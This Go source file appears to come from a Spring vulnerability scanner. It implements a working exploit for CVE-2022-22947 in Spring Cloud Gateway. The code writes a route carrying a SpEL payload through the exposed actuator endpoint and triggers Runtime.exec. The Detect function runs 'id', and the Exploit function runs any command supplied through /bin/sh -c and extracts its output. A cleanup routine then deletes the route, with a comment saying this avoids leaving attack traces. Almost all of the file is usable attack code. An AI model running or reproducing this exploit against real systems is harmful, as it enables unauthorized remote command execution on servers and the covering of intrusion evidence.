package vulns

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2022-22947 Spring Cloud Gateway SpEL RCE。
// 通过 actuator 写入带 SpEL 的路由并 refresh 触发执行，命令输出回显于
// 路由定义中，用完即清理。路由 ID 每次随机生成，避免与目标上已有路由冲突。
type cve202222947 struct{}

func init() { Register(&cve202222947{}) }

const gwRefreshPath = "actuator/gateway/refresh"

var gwJSONHeaders = map[string]string{"Content-Type": "application/json"}

func (c *cve202222947) Info() model.Info {
	return model.Info{
		ID:         "CVE-2022-22947",
		Name:       "Spring Cloud Gateway SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Cloud Gateway < 3.1.1 / < 3.2.4（actuator 端点暴露）",
		Reference:  "https://spring.io/security/cve-2022-22947",
		HasExploit: true,
		ArgHint:    "要执行的命令",
	}
}

func gwRoutePayload(routeID, execSnippet string) string {
	return fmt.Sprintf(`{
  "id": "%s",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {"name": "Result", "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream()))}"}
  }],
  "uri": "http://example.com",
  "order": 0
}`, routeID, execSnippet)
}

// escapeSpELArg 将命令安全嵌入 JSON 包裹的 SpEL 数组字面量。
func escapeSpELArg(cmd string) string {
	r := strings.NewReplacer(`\`, `\\\\`, `"`, `\\\"`, "\n", " ", "\r", "")
	return r.Replace(cmd)
}

// cleanup 删除路由并刷新，避免遗留攻击痕迹。
func (c *cve202222947) cleanup(ctx context.Context, t model.Target, routePath string) {
	_, _, _ = do(ctx, t, http.MethodDelete, routePath, gwJSONHeaders, "")
	_, _, _ = do(ctx, t, http.MethodPost, gwRefreshPath, gwJSONHeaders, "")
}

func (c *cve202222947) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	routeID := fmt.Sprintf("ssp%04d", rand.Intn(10000))
	routePath := "actuator/gateway/routes/" + routeID

	if _, _, err := do(ctx, t, http.MethodPost, routePath, gwJSONHeaders,
		gwRoutePayload(routeID, `new String[]{\"id\"}`)); err != nil {
		return nil, err
	}
	if _, _, err := do(ctx, t, http.MethodPost, gwRefreshPath, gwJSONHeaders, ""); err != nil {
		return nil, err
	}
	_, body, err := do(ctx, t, http.MethodGet, routePath, gwJSONHeaders, "")
	c.cleanup(ctx, t, routePath)
	if err != nil {
		return nil, err
	}

	if strings.Contains(string(body), "uid=") && strings.Contains(string(body), "gid=") && strings.Contains(string(body), "groups=") {
		v.Vulnerable = true
		v.Evidence = "id 命令输出已回显于路由响应"
	}
	return v, nil
}

func (c *cve202222947) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	routeID := fmt.Sprintf("ssp%04d", rand.Intn(10000))
	routePath := "actuator/gateway/routes/" + routeID

	snippet := fmt.Sprintf(`new String[]{\"/bin/sh\",\"-c\",\"%s\"}`, escapeSpELArg(arg))
	if _, _, err := do(ctx, t, http.MethodPost, routePath, gwJSONHeaders, gwRoutePayload(routeID, snippet)); err != nil {
		return "", "", err
	}
	if _, _, err := do(ctx, t, http.MethodPost, gwRefreshPath, gwJSONHeaders, ""); err != nil {
		return "", "", err
	}
	var body []byte
	for i := 0; i < 5; i++ {
		resp, rb, err := do(ctx, t, http.MethodGet, routePath, gwJSONHeaders, "")
		if err != nil {
			return "", "", err
		}
		if resp.StatusCode == http.StatusOK {
			body = rb
			break
		}
		time.Sleep(400 * time.Millisecond)
	}
	c.cleanup(ctx, t, routePath)

	// 命令输出嵌在路由求值结果里：Result = '<output>\n'，提取并还原换行
	re := regexp.MustCompile(`Result = '(.*?)'`)
	if m := re.FindStringSubmatch(string(body)); len(m) > 1 {
		out := strings.ReplaceAll(m[1], `\n`, "\n")
		return strings.TrimRight(out, "\n"), "", nil
	}
	if strings.Contains(string(body), "uid=") || strings.Contains(string(body), "gid=") {
		return string(body), "未能结构化提取输出，已返回原始响应", nil
	}
	return "", "命令可能已执行但路由响应中未见输出（windows 目标请改用 cmd.exe 语法）", nil
}
